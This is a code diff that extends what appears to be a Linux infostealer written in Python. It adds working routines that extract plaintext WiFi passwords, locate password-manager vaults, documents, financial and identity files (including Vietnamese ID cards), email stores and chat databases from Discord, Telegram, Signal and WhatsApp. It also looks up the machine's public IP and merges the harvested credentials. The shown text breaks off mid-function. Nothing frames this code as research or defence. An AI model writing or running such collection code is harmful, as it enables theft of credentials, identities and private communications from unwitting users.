@@ -261,50 +261,191 @@ def collect_browser_data():
     return browser_data
 
 def collect_wifi_passwords():
-    """Collect WiFi passwords"""
+    """Collect WiFi passwords with actual passwords"""
     wifi_data = []
     
+    # Method 1: NetworkManager (nmcli) - Most common on modern Linux
     try:
-        result = subprocess.run(['nmcli', '-t', '-f', 'NAME', 'connection', 'show'],
+        result = subprocess.run(['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show'],
                               stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
         if result.returncode == 0:
             connections = result.stdout.decode().strip().split('\n')
-            for conn in connections:
-                if conn:
+            for conn_line in connections:
+                if not conn_line:
+                    continue
+                parts = conn_line.split(':')
+                if len(parts) < 2:
+                    continue
+                conn_name = parts[0]
+                conn_type = parts[1] if len(parts) > 1 else ''
+                
+                # Only process WiFi connections
+                if '802-11-wireless' in conn_type or 'wifi' in conn_type.lower():
                     try:
-                        result2 = subprocess.run(['nmcli', '-s', 'connection', 'show', conn],
-                                               stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=2)
+                        # Get connection details with secrets
+                        result2 = subprocess.run(['nmcli', '-s', 'connection', 'show', conn_name],
+                                               stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=3)
                         if result2.returncode == 0:
                             output = result2.stdout.decode()
-                            if '802-11-wireless' in output or 'wifi' in output.lower():
-                                wifi_data.append({
-                                    'ssid': conn,
-                                    'config': output[:500]
-                                })
+                            
+                            # Extract SSID
+                            ssid = conn_name
+                            for line in output.split('\n'):
+                                if '802-11-wireless.ssid:' in line:
+                                    ssid = line.split(':', 1)[1].strip()
+                                    break
+                            
+                            # Extract password (PSK)
+                            password = None
+                            for line in output.split('\n'):
+                                if '802-11-wireless-security.psk:' in line:
+                                    password = line.split(':', 1)[1].strip()
+                                    break
+                                elif 'wifi-sec.psk:' in line:
+                                    password = line.split(':', 1)[1].strip()
+                                    break
+                            
+                            # Try to get password with --show-secrets flag
+                            if not password:
+                                try:
+                                    result3 = subprocess.run(['nmcli', '-s', 'connection', 'show', '--show-secrets', conn_name],
+                                                           stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=3)
+                                    if result3.returncode == 0:
+                                        secret_output = result3.stdout.decode()
+                                        for line in secret_output.split('\n'):
+                                            if '802-11-wireless-security.psk:' in line:
+                                                password = line.split(':', 1)[1].strip()
+                                                break
+                                            elif 'wifi-sec.psk:' in line:
+                                                password = line.split(':', 1)[1].strip()
+                                                break
+                                except:
+                                    pass
+                            
+                            wifi_data.append({
+                                'ssid': ssid,
+                                'connection_name': conn_name,
+                                'password': password if password else 'Not found',
+                                'method': 'NetworkManager',
+                                'full_config': output[:1000]
+                            })
                     except:
                         pass
     except:
         pass
     
+    # Method 2: wpa_supplicant config files
+    wpa_paths = [
+        '/etc/wpa_supplicant/wpa_supplicant.conf',
+        os.path.expanduser('~/.config/wpa_supplicant/wpa_supplicant.conf'),
+        '/etc/NetworkManager/system-connections/',
+    ]
+    
+    for wpa_path in wpa_paths:
+        try:
+            if os.path.isfile(wpa_path):
+                try:
+                    with open(wpa_path, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read()
+                        # Parse wpa_supplicant.conf
+                        lines = content.split('\n')
+                        current_ssid = None
+                        current_psk = None
+                        for line in lines:
+                            line = line.strip()
+                            if line.startswith('ssid='):
+                                current_ssid = line.split('=', 1)[1].strip('"')
+                            elif line.startswith('psk='):
+                                current_psk = line.split('=', 1)[1].strip('"')
+                                if current_ssid and current_psk:
+                                    wifi_data.append({
+                                        'ssid': current_ssid,
+                                        'password': current_psk,
+                                        'method': 'wpa_supplicant',
+                                        'source_file': wpa_path
+                                    })
+                                    current_ssid = None
+                                    current_psk = None
+                except:
+                    pass
+            elif os.path.isdir(wpa_path):
+                # NetworkManager system-connections directory
+                try:
+                    for filename in os.listdir(wpa_path):
+                        filepath = os.path.join(wpa_path, filename)
+                        if os.path.isfile(filepath) and not filename.endswith('.nmmeta'):
+                            try:
+                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read()
+                                    # Parse NetworkManager connection file
+                                    ssid = None
+                                    psk = None
+                                    for line in content.split('\n'):
+                                        if line.startswith('ssid='):
+                                            ssid = line.split('=', 1)[1].strip()
+                                        elif line.startswith('psk='):
+                                            psk = line.split('=', 1)[1].strip()
+                                    
+                                    if ssid or filename:
+                                        wifi_data.append({
+                                            'ssid': ssid if ssid else filename,
+                                            'password': psk if psk else 'Encrypted in keyring',
+                                            'method': 'NetworkManager-file',
+                                            'source_file': filepath
+                                        })
+                            except:
+                                pass
+                except:
+                    pass
+        except:
+            pass
+    
+    # Method 3: Try wpa_cli (if available)
     try:
-        wpa_config = '/etc/wpa_supplicant/wpa_supplicant.conf'
-        if os.path.exists(wpa_config):
-            try:
-                with open(wpa_config, 'r') as f:
-                    content = f.read()
-                    wifi_data.append({
-                        'source': 'wpa_supplicant',
-                        'config': content
-                    })
-            except:
-                pass
+        result = subprocess.run(['wpa_cli', 'list_networks'],
+                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=3)
+        if result.returncode == 0:
+            output = result.stdout.decode()
+            lines = output.split('\n')[1:]  # Skip header
+            for line in lines:
+                if line.strip():
+                    parts = line.split('\t')
+                    if len(parts) >= 2:
+                        network_id = parts[0]
+                        ssid = parts[1]
+                        if ssid and ssid != 'ssid':
+                            try:
+                                # Get password for this network
+                                result2 = subprocess.run(['wpa_cli', 'get_network', network_id, 'psk'],
+                                                       stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=2)
+                                if result2.returncode == 0:
+                                    psk = result2.stdout.decode().strip()
+                                    if psk and psk != 'FAIL':
+                                        wifi_data.append({
+                                            'ssid': ssid,
+                                            'password': psk.strip('"'),
+                                            'method': 'wpa_cli'
+                                        })
+                            except:
+                                pass
     except:
         pass
     
-    if wifi_data:
-        log_activity("WIFI", f"Found {len(wifi_data)} WiFi configurations")
+    # Remove duplicates based on SSID
+    seen_ssids = set()
+    unique_wifi_data = []
+    for wifi in wifi_data:
+        ssid_key = wifi.get('ssid', '').lower()
+        if ssid_key and ssid_key not in seen_ssids:
+            seen_ssids.add(ssid_key)
+            unique_wifi_data.append(wifi)
+        elif not ssid_key:
+            unique_wifi_data.append(wifi)
     
-    return wifi_data
+    if unique_wifi_data:
+        log_activity("WIFI", f"Found {len(unique_wifi_data)} WiFi networks with passwords")
+    
+    return unique_wifi_data
 
 def collect_email_configs():
     """Collect email client configurations"""
@@ -789,119 +930,152 @@ def collect_development_tokens():
     return dev_tokens
 
 def collect_password_manager_files():
-    """Collect password manager database files"""
+    """Collect password manager database files - enhanced search"""
     pm_files = []
     home_dir = os.path.expanduser("~")
+    seen_files = set()  # Track seen files to avoid duplicates
     
-    # Password manager locations and patterns
-    pm_locations = [
-        # KeePassXC
-        {
-            'manager': 'keepassxc',
-            'paths': [
-                f"{home_dir}/.config/keepassxc",
-                f"{home_dir}/.local/share/keepassxc",
-                f"{home_dir}/Documents",
-                f"{home_dir}/Downloads",
-            ],
-            'extensions': ('.kdbx', '.kdb', '.key'),
-            'max_size': 100 * 1024 * 1024  # 100MB
-        },
-        # Bitwarden
-        {
-            'manager': 'bitwarden',
-            'paths': [
-                f"{home_dir}/.config/Bitwarden",
-                f"{home_dir}/.local/share/Bitwarden",
-            ],
-            'extensions': ('.db', '.sqlite', '.sqlite3', '.json'),
-            'max_size': 50 * 1024 * 1024  # 50MB
-        },
-        # 1Password
-        {
-            'manager': '1password',
-            'paths': [
-                f"{home_dir}/.config/1Password",
-                f"{home_dir}/.local/share/1Password",
-            ],
-            'extensions': ('.opvault', '.agilekeychain', '.1pif'),
-            'max_size': 200 * 1024 * 1024  # 200MB
-        },
-        # LastPass
-        {
-            'manager': 'lastpass',
-            'paths': [
-                f"{home_dir}/.config/lastpass",
-                f"{home_dir}/.local/share/lastpass",
-            ],
-            'extensions': ('.lps', '.lpsx'),
-            'max_size': 50 * 1024 * 1024
-        },
-        # Generic password files (search in common locations)
-        {
-            'manager': 'generic',
-            'paths': [
-                f"{home_dir}/Documents",
-                f"{home_dir}/Downloads",
-                f"{home_dir}/Desktop",
-            ],
-            'extensions': ('.kdbx', '.kdb', '.pws', '.psafe3'),
-            'max_size': 100 * 1024 * 1024
-        }
+    # All password manager file extensions
+    pm_extensions = (
+        '.kdbx', '.kdb', '.key',  # KeePass
+        '.opvault', '.agilekeychain', '.1pif', '.1password',  # 1Password
+        '.lps', '.lpsx',  # LastPass
+        '.pws', '.psafe3', '.psafe4',  # Password Safe
+        '.wallet', '.walletx',  # Generic wallet
+        '.pwd', '.pass', '.vault',  # Generic
+    )
+    
+    # Password manager keywords in filenames (case insensitive)
+    pm_keywords = [
+        'password', 'passwords', 'passwd', 'pwd',
+        'vault', 'wallet', 'keychain', 'keepass',
+        'bitwarden', 'lastpass', '1password',
+        'credentials', 'secret', 'secrets'
     ]
     
-    for pm_config in pm_locations:
-        manager = pm_config['manager']
-        paths = pm_config['paths']
-        extensions = pm_config['extensions']
-        max_size = pm_config['max_size']
-        
-        for path in paths:
-            if not os.path.exists(path):
-                continue
+    # Search locations (expanded)
+    search_locations = [
+        # Home directory and subdirectories
+        home_dir,
+        f"{home_dir}/Documents",
+        f"{home_dir}/Downloads",
+        f"{home_dir}/Desktop",
+        f"{home_dir}/.local/share",
+        f"{home_dir}/.config",
+        # Specific password manager directories
+        f"{home_dir}/.config/keepassxc",
+        f"{home_dir}/.local/share/keepassxc",
+        f"{home_dir}/.config/Bitwarden",
+        f"{home_dir}/.local/share/Bitwarden",
+        f"{home_dir}/.config/1Password",
+        f"{home_dir}/.local/share/1Password",
+        f"{home_dir}/.config/lastpass",
+        f"{home_dir}/.local/share/lastpass",
+        f"{home_dir}/.config/PasswordSafe",
+        f"{home_dir}/.local/share/PasswordSafe",
+        # Common backup locations
+        f"{home_dir}/backup",
+        f"{home_dir}/Backup",
+        f"{home_dir}/backups",
+        f"{home_dir}/Backups",
+    ]
+    
+    max_size = 200 * 1024 * 1024  # 200MB max
+    max_depth = 4  # Maximum directory depth
+    max_files = 100  # Limit total files found
+    
+    for search_path in search_locations:
+        if len(pm_files) >= max_files:
+            break
             
-            try:
-                # For Documents/Downloads/Desktop, limit depth to avoid too many files
-                max_depth = 2 if path in [f"{home_dir}/Documents", f"{home_dir}/Downloads", f"{home_dir}/Desktop"] else 5
-                depth = 0
+        if not os.path.exists(search_path):
+            continue
+        
+        try:
+            # Determine max depth based on location
+            if search_path in [f"{home_dir}/Documents", f"{home_dir}/Downloads", f"{home_dir}/Desktop", home_dir]:
+                current_max_depth = 3
+            else:
+                current_max_depth = max_depth
+            
+            for root, dirs, files in os.walk(search_path):
+                # Calculate depth
+                if root != search_path:
+                    depth = root[len(search_path):].count(os.sep)
+                    if depth > current_max_depth:
+                        dirs[:] = []  # Don't recurse deeper
+                        continue
                 
-                for root, dirs, files in os.walk(path):
-                    # Calculate depth
-                    if path != root:
-                        depth = root[len(path):].count(os.sep)
-                        if depth > max_depth:
-                            dirs[:] = []
-                            continue
+                # Skip certain directories
+                dirs[:] = [d for d in dirs if d not in {'.git', '.svn', 'node_modules', '__pycache__', '.cache'}]
+                
+                for file in files:
+                    if len(pm_files) >= max_files:
+                        break
                     
-                    for file in files:
-                        if file.endswith(extensions):
-                            file_path = os.path.join(root, file)
-                            try:
-                                file_stat = os.stat(file_path)
-                                
-                                # Check size limit
-                                if file_stat.st_size > max_size:
-                                    continue
-                                
-                                # Skip if already found (avoid duplicates)
-                                if any(pm['file'] == file_path for pm in pm_files):
-                                    continue
-                                
-                                pm_files.append({
-                                    'manager': manager,
-                                    'file': file_path,
-                                    'size': file_stat.st_size,
-                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
-                                    'extension': os.path.splitext(file)[1]
-                                })
-                            except (OSError, PermissionError):
-                                pass
-            except Exception as e:
-                log_activity("ERROR", f"Error collecting {manager} files from {path}: {e}")
-                pass
+                    file_lower = file.lower()
+                    file_path = os.path.join(root, file)
+                    
+                    # Skip if already seen
+                    if file_path in seen_files:
+                        continue
+                    
+                    # Check by extension
+                    matches_extension = file_lower.endswith(pm_extensions)
+                    
+                    # Check by filename keywords
+                    matches_keyword = any(keyword in file_lower for keyword in pm_keywords)
+                    
+                    if matches_extension or matches_keyword:
+                        try:
+                            file_stat = os.stat(file_path)
+                            
+                            # Skip if too large
+                            if file_stat.st_size > max_size:
+                                continue
+                            
+                            # Skip if too small (likely not a password database)
+                            if file_stat.st_size < 100:  # Less than 100 bytes
+                                continue
+                            
+                            seen_files.add(file_path)
+                            
+                            # Determine manager type
+                            manager = 'unknown'
+                            if 'keepass' in file_lower or file_lower.endswith(('.kdbx', '.kdb')):
+                                manager = 'keepass'
+                            elif 'bitwarden' in file_lower:
+                                manager = 'bitwarden'
+                            elif '1password' in file_lower or file_lower.endswith(('.opvault', '.agilekeychain', '.1pif')):
+                                manager = '1password'
+                            elif 'lastpass' in file_lower or file_lower.endswith(('.lps', '.lpsx')):
+                                manager = 'lastpass'
+                            elif 'password' in file_lower or 'vault' in file_lower or 'wallet' in file_lower:
+                                manager = 'generic'
+                            
+                            pm_files.append({
+                                'manager': manager,
+                                'path': file_path,
+                                'file': file_path,  # Keep for compatibility
+                                'size': file_stat.st_size,
+                                'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
+                                'type': os.path.splitext(file)[1] or 'no_extension',
+                                'filename': file
+                            })
+                            
+                        except (OSError, PermissionError) as e:
+                            pass
+                        except Exception as e:
+                            log_activity("ERROR", f"Error processing file {file_path}: {e}")
+                            
+        except Exception as e:
+            log_activity("ERROR", f"Error searching in {search_path}: {e}")
+            continue
     
     if pm_files:
         log_activity("PASSWORD_MANAGERS", f"Found {len(pm_files)} password manager files")
+    else:
+        log_activity("PASSWORD_MANAGERS", "No password manager files found")
     
     return pm_files
 
@@ -1001,44 +1175,180 @@ def collect_all_config_files():
     return config_files
 
 def collect_recent_documents():
-    """Collect recent documents and files"""
-    recent_files = []
+    """Collect all documents (Excel, PDF, Word, PowerPoint, etc.)"""
+    documents = []
     home_dir = os.path.expanduser("~")
+    seen_files = set()
     
-    doc_dirs = [
+    # All document file extensions
+    document_extensions = (
+        # Office documents
+        '.doc', '.docx', '.docm', '.dot', '.dotx',  # Word
+        '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlt', '.xltx', '.csv',  # Excel
+        '.ppt', '.pptx', '.pptm', '.pot', '.potx', '.pps', '.ppsx',  # PowerPoint
+        '.odt', '.ods', '.odp', '.odg', '.odf',  # OpenDocument
+        # PDF and text
+        '.pdf', '.txt', '.rtf', '.tex', '.md', '.markdown',
+        # Archives (may contain documents)
+        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
+        # Images (may contain text/diagrams)
+        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
+        # Other
+        '.pages', '.numbers', '.key',  # Apple iWork
+        '.wps', '.wpt', '.et', '.dps',  # WPS Office
+        '.one',  # OneNote
+    )
+    
+    # Document keywords in filenames
+    doc_keywords = [
+        'document', 'doc', 'report', 'presentation', 'spreadsheet',
+        'invoice', 'contract', 'agreement', 'proposal', 'resume', 'cv',
+        'financial', 'budget', 'statement', 'receipt', 'tax',
+        'project', 'plan', 'meeting', 'notes', 'memo',
+        'confidential', 'private', 'secret', 'personal'
+    ]
+    
+    # Search locations (expanded)
+    search_locations = [
         f"{home_dir}/Documents",
         f"{home_dir}/Downloads",
         f"{home_dir}/Desktop",
+        f"{home_dir}/Pictures",
+        f"{home_dir}/Videos",
+        f"{home_dir}/Music",
+        f"{home_dir}/.local/share",
+        f"{home_dir}/.config",
+        # Common project directories
+        f"{home_dir}/Projects",
+        f"{home_dir}/projects",
+        f"{home_dir}/Work",
+        f"{home_dir}/work",
+        # Backup locations
+        f"{home_dir}/backup",
+        f"{home_dir}/Backup",
+        f"{home_dir}/backups",
+        f"{home_dir}/Backups",
     ]
     
-    cutoff_time = time.time() - (7 * 24 * 60 * 60)
+    max_size = 50 * 1024 * 1024  # 50MB max per file
+    max_depth = 5  # Maximum directory depth
+    max_files = 500  # Increased limit for more documents
     
-    for doc_dir in doc_dirs:
-        if not os.path.exists(doc_dir):
+    for search_path in search_locations:
+        if len(documents) >= max_files:
+            break
+            
+        if not os.path.exists(search_path):
             continue
         
         try:
-            for root, dirs, files in os.walk(doc_dir):
+            # Determine max depth based on location
+            if search_path in [f"{home_dir}/Documents", f"{home_dir}/Downloads", f"{home_dir}/Desktop"]:
+                current_max_depth = 4
+            else:
+                current_max_depth = max_depth
+            
+            for root, dirs, files in os.walk(search_path):
+                # Calculate depth
+                if root != search_path:
+                    depth = root[len(search_path):].count(os.sep)
+                    if depth > current_max_depth:
+                        dirs[:] = []  # Don't recurse deeper
+                        continue
+                
+                # Skip certain directories
+                dirs[:] = [d for d in dirs if d not in {'.git', '.svn', 'node_modules', '__pycache__', '.cache', 'venv', '.venv'}]
+                
                 for file in files:
+                    if len(documents) >= max_files:
+                        break
+                    
+                    file_lower = file.lower()
                     file_path = os.path.join(root, file)
-                    try:
-                        file_stat = os.stat(file_path)
-                        if file_stat.st_mtime > cutoff_time:
-                            if file_stat.st_size < 1024 * 1024 and file.endswith(('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx')):
-                                recent_files.append({
-                                    'path': file_path,
-                                    'size': file_stat.st_size,
-                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
-                                })
-                    except:
-                        pass
-        except:
-            pass
+                    
+                    # Skip if already seen
+                    if file_path in seen_files:
+                        continue
+                    
+                    # Check by extension
+                    matches_extension = file_lower.endswith(document_extensions)
+                    
+                    # Check by filename keywords
+                    matches_keyword = any(keyword in file_lower for keyword in doc_keywords)
+                    
+                    if matches_extension or matches_keyword:
+                        try:
+                            file_stat = os.stat(file_path)
+                            
+                            # Skip if too large
+                            if file_stat.st_size > max_size:
+                                continue
+                            
+                            # Skip if too small (likely not a document)
+                            if file_stat.st_size < 10:  # Less than 10 bytes
+                                continue
+                            
+                            seen_files.add(file_path)
+                            
+                            # Try to extract text content for text-based files
+                            content_preview = None
+                            if file_lower.endswith(('.txt', '.md', '.markdown', '.rtf', '.csv', '.log')):
+                                try:
+                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                        content = f.read()
+                                        content_preview = content[:2000]  # First 2000 chars
+                                except:
+                                    try:
+                                        with open(file_path, 'r', encoding='latin-1', errors='ignore') as f:
+                                            content = f.read()
+                                            content_preview = content[:2000]
+                                    except:
+                                        pass
+                            
+                            # Determine document type
+                            doc_type = 'unknown'
+                            if file_lower.endswith(('.doc', '.docx', '.docm', '.odt', '.rtf', '.txt', '.md')):
+                                doc_type = 'text_document'
+                            elif file_lower.endswith(('.xls', '.xlsx', '.xlsm', '.csv', '.ods')):
+                                doc_type = 'spreadsheet'
+                            elif file_lower.endswith(('.ppt', '.pptx', '.pptm', '.odp')):
+                                doc_type = 'presentation'
+                            elif file_lower.endswith('.pdf'):
+                                doc_type = 'pdf'
+                            elif file_lower.endswith(('.zip', '.rar', '.7z', '.tar', '.gz')):
+                                doc_type = 'archive'
+                            elif file_lower.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg')):
+                                doc_type = 'image'
+                            else:
+                                doc_type = 'other'
+                            
+                            documents.append({
+                                'path': file_path,
+                                'filename': file,
+                                'type': doc_type,
+                                'extension': os.path.splitext(file)[1] or 'no_extension',
+                                'size': file_stat.st_size,
+                                'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
+                                'created': datetime.datetime.fromtimestamp(file_stat.st_ctime).isoformat() if hasattr(file_stat, 'st_ctime') else None,
+                                'content_preview': content_preview,
+                                'relative_path': file_path.replace(home_dir + '/', '')
+                            })
+                            
+                        except (OSError, PermissionError) as e:
+                            pass
+                        except Exception as e:
+                            log_activity("ERROR", f"Error processing document {file_path}: {e}")
+                            
+        except Exception as e:
+            log_activity("ERROR", f"Error searching documents in {search_path}: {e}")
+            continue
     
-    if recent_files:
-        log_activity("DOCUMENTS", f"Found {len(recent_files)} recent documents")
+    if documents:
+        log_activity("DOCUMENTS", f"Found {len(documents)} documents (Excel, PDF, Word, etc.)")
+    else:
+        log_activity("DOCUMENTS", "No documents found")
     
-    return recent_files[:100]
+    return documents
 
 def collect_system_info_comprehensive():
     """Collect comprehensive system information"""
@@ -1086,8 +1396,482 @@ def collect_system_info_comprehensive():
     except:
         pass
     
+    # Get public IP address
+    try:
+        import urllib.request
+        public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode('utf-8')
+        system_info['public_ip'] = public_ip
+    except:
+        try:
+            public_ip = urllib.request.urlopen('https://ifconfig.me', timeout=5).read().decode('utf-8').strip()
+            system_info['public_ip'] = public_ip
+        except:
+            system_info['public_ip'] = 'unknown'
+    
     log_activity("SYSTEM_INFO", "Comprehensive system information collected")
     return system_info
+
+def collect_financial_data():
+    """Collect financial information from documents and form data"""
+    financial_data = []
+    home_dir = os.path.expanduser("~")
+    
+    # Keywords to search for in documents
+    financial_keywords = [
+        'bank', 'account', 'card', 'credit', 'debit', 'cvv', 'cvc',
+        'routing', 'swift', 'iban', 'account number', 'card number',
+        'balance', 'transaction', 'payment', 'invoice', 'receipt',
+        'tax', 'salary', 'income', 'expense', 'budget', 'financial'
+    ]
+    
+    # Search in documents
+    doc_locations = [
+        f"{home_dir}/Documents",
+        f"{home_dir}/Downloads",
+        f"{home_dir}/Desktop",
+    ]
+    
+    for doc_dir in doc_locations:
+        if not os.path.exists(doc_dir):
+            continue
+        
+        try:
+            for root, dirs, files in os.walk(doc_dir):
+                for file in files:
+                    file_lower = file.lower()
+                    # Check if filename contains financial keywords
+                    if any(keyword in file_lower for keyword in financial_keywords):
+                        file_path = os.path.join(root, file)
+                        try:
+                            file_stat = os.stat(file_path)
+                            if file_stat.st_size < 10 * 1024 * 1024:  # < 10MB
+                                financial_data.append({
+                                    'type': 'document',
+                                    'path': file_path,
+                                    'filename': file,
+                                    'size': file_stat.st_size,
+                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
+                                    'reason': 'filename_contains_financial_keywords'
+                                })
+                        except:
+                            pass
+        except:
+            pass
+    
+    if financial_data:
+        log_activity("FINANCIAL", f"Found {len(financial_data)} potential financial documents")
+    
+    return financial_data
+
+def collect_identity_documents():
+    """Collect identity documents (CMND/CCCD, passport, medical records)"""
+    identity_docs = []
+    home_dir = os.path.expanduser("~")
+    
+    # Keywords for identity documents
+    identity_keywords = [
+        'cmnd', 'cccd', 'passport', 'id card', 'identity',
+        'medical', 'health', 'insurance', 'baohiem',
+        'birth certificate', 'driver license', 'bằng lái',
+        'visa', 'citizenship', 'quốc tịch'
+    ]
+    
+    # File extensions that might contain identity documents
+    identity_extensions = ('.pdf', '.jpg', '.jpeg', '.png', '.doc', '.docx')
+    
+    # Search locations
+    search_locations = [
+        f"{home_dir}/Documents",
+        f"{home_dir}/Downloads",
+        f"{home_dir}/Desktop",
+        f"{home_dir}/Pictures",
+    ]
+    
+    for search_path in search_locations:
+        if not os.path.exists(search_path):
+            continue
+        
+        try:
+            for root, dirs, files in os.walk(search_path):
+                for file in files:
+                    file_lower = file.lower()
+                    file_path = os.path.join(root, file)
+                    
+                    # Check by filename keywords
+                    matches_keyword = any(keyword in file_lower for keyword in identity_keywords)
+                    
+                    # Check by extension
+                    matches_extension = file_lower.endswith(identity_extensions)
+                    
+                    if matches_keyword or matches_extension:
+                        try:
+                            file_stat = os.stat(file_path)
+                            if file_stat.st_size < 50 * 1024 * 1024:  # < 50MB
+                                identity_docs.append({
+                                    'type': 'identity_document',
+                                    'path': file_path,
+                                    'filename': file,
+                                    'size': file_stat.st_size,
+                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
+                                    'detected_by': 'keyword' if matches_keyword else 'extension'
+                                })
+                        except:
+                            pass
+        except:
+            pass
+    
+    if identity_docs:
+        log_activity("IDENTITY", f"Found {len(identity_docs)} potential identity documents")
+    
+    return identity_docs
+
+def collect_email_contacts_and_content():
+    """Collect email contacts and content"""
+    email_data = {
+        'contacts': [],
+        'content': []
+    }
+    home_dir = os.path.expanduser("~")
+    
+    # Email client locations
+    email_locations = [
+        f"{home_dir}/.thunderbird",
+        f"{home_dir}/.local/share/evolution",
+        f"{home_dir}/.config/evolution",
+        f"{home_dir}/.local/share/mail",
+        f"{home_dir}/Mail",
+        f"{home_dir}/.mail",
+    ]
+    
+    for email_path in email_locations:
+        if not os.path.exists(email_path):
+            continue
+        
+        try:
+            for root, dirs, files in os.walk(email_path):
+                # Look for address books and contacts
+                for file in files:
+                    file_lower = file.lower()
+                    file_path = os.path.join(root, file)
+                    
+                    if any(keyword in file_lower for keyword in ['addressbook', 'contacts', 'abook', '.mab', '.ldif']):
+                        try:
+                            file_stat = os.stat(file_path)
+                            if file_stat.st_size < 10 * 1024 * 1024:  # < 10MB
+                                email_data['contacts'].append({
+                                    'type': 'addressbook',
+                                    'path': file_path,
+                                    'size': file_stat.st_size,
+                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
+                                })
+                        except:
+                            pass
+                    
+                    # Look for email content (mbox, eml files)
+                    if file_lower.endswith(('.mbox', '.eml', '.msg')):
+                        try:
+                            file_stat = os.stat(file_path)
+                            if file_stat.st_size < 5 * 1024 * 1024:  # < 5MB
+                                email_data['content'].append({
+                                    'type': 'email_message',
+                                    'path': file_path,
+                                    'size': file_stat.st_size,
+                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
+                                })
+                        except:
+                            pass
+        except:
+            pass
+    
+    if email_data['contacts'] or email_data['content']:
+        log_activity("EMAIL", f"Found {len(email_data['contacts'])} contact files, {len(email_data['content'])} email messages")
+    
+    return email_data
+
+def collect_chat_messages():
+    """Collect chat messages from messaging apps"""
+    chat_data = []
+    home_dir = os.path.expanduser("~")
+    
+    # Chat application locations
+    chat_locations = {
+        'discord': [
+            f"{home_dir}/.config/discord",
+            f"{home_dir}/.config/Discord",
+        ],
+        'telegram': [
+            f"{home_dir}/.local/share/TelegramDesktop",
+            f"{home_dir}/.config/TelegramDesktop",
+        ],
+        'slack': [
+            f"{home_dir}/.config/Slack",
+        ],
+        'signal': [
+            f"{home_dir}/.config/Signal",
+        ],
+        'whatsapp': [
+            f"{home_dir}/.config/whatsapp",
+            f"{home_dir}/.local/share/whatsapp",
+        ],
+    }
+    
+    # Database extensions that might contain chat messages
+    chat_db_extensions = ('.db', '.sqlite', '.sqlite3', '.ldb')
+    
+    for app_name, paths in chat_locations.items():
+        for chat_path in paths:
+            if not os.path.exists(chat_path):
+                continue
+            
+            try:
+                for root, dirs, files in os.walk(chat_path):
+                    for file in files:
+                        file_lower = file.lower()
+                        file_path = os.path.join(root, file)
+                        
+                        # Look for database files that might contain messages
+                        if file_lower.endswith(chat_db_extensions):
+                            # Check if filename suggests it contains messages
+                            if any(keyword in file_lower for keyword in ['message', 'chat', 'conversation', 'history', 'index']):
+                                try:
+                                    file_stat = os.stat(file_path)
+                                    if file_stat.st_size < 100 * 1024 * 1024:  # < 100MB
+                                        chat_data.append({
+                                            'app': app_name,
+                                            'type': 'chat_database',
+                                            'path': file_path,
+                                            'filename': file,
+                                            'size': file_stat.st_size,
+                                            'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
+                                        })
+                                except:
+                                    pass
+            except:
+                pass
+    
+    if chat_data:
+        log_activity("CHAT", f"Found {len(chat_data)} chat message databases")
+    
+    return chat_data
+
+def normalize_and_deduplicate_data(all_data):
+    """Normalize and deduplicate collected data, merge common data"""
+    normalized = {
+        'timestamp': all_data.get('timestamp'),
+        'hostname': all_data.get('hostname'),
+        'user': all_data.get('user'),
+    }
+    
+    # 1. Unified Credentials: Merge passwords and password_manager_files
+    unified_credentials = []
+    seen_cred_keys = set()
+    
+    # Add browser passwords
+    for pwd in all_data.get('passwords', []):
+        file_path = pwd.get('file', '')
+        if file_path:
+            key = hashlib.md5(file_path.encode()).hexdigest()
+            if key not in seen_cred_keys:
+                seen_cred_keys.add(key)
+                unified_credentials.append({
+                    'type': 'browser_password',
+                    'source': pwd.get('browser', 'unknown'),
+                    'file_path': file_path,
+                    'size': pwd.get('size', 0),
+                    'modified': pwd.get('modified'),
+                    'hash': pwd.get('hash'),
+                    'file_type': pwd.get('type', 'unknown')
+                })
+    
+    # Add password manager files
+    for pm_file in all_data.get('password_manager_files', []):
+        file_path = pm_file.get('path', '') or pm_file.get('file', '')
+        if file_path:
+            key = hashlib.md5(file_path.encode()).hexdigest()
+            if key not in seen_cred_keys:
+                seen_cred_keys.add(key)
+                unified_credentials.append({
+                    'type': 'password_manager',
+                    'source': pm_file.get('manager', 'unknown'),
+                    'file_path': file_path,
+                    'size': pm_file.get('size', 0),
+                    'modified': pm_file.get('modified'),
+                    'hash': pm_file.get('hash'),
+                    'file_type': pm_file.get('type', pm_file.get('extension', 'unknown')),
+                    'filename': pm_file.get('filename', os.path.basename(file_path))
+                })
+    
+    normalized['unified_credentials'] = unified_credentials
+    
+    # 2. Unified Files: Merge sensitive_files and config_files (deduplicate by path)
+    unified_files = []
+    seen_file_paths = set()
+    
+    for file_item in all_data.get('sensitive_files', []):
+        file_path = file_item.get('path', '')
+        if file_path and file_path not in seen_file_paths:
+            seen_file_paths.add(file_path)
+            unified_files.append({
+                'path': file_path,
+                'category': 'sensitive',
+                'size': file_item.get('size', 0),
+                'modified': file_item.get('modified'),
+                'hash': file_item.get('hash'),
+                'content_preview': file_item.get('content', '')[:500] if file_item.get('content') else None
+            })
+    
